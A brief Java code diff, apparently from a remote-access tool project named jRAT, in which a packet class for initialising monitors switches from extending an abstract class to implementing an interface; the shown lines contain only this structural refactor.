@@ -6,7 +6,7 @@ import jrat.common.utils.Utils;
 import java.awt.*;
 
 
-public class Packet18InitMonitors extends AbstractOutgoingPacket {
+public class Packet18InitMonitors implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
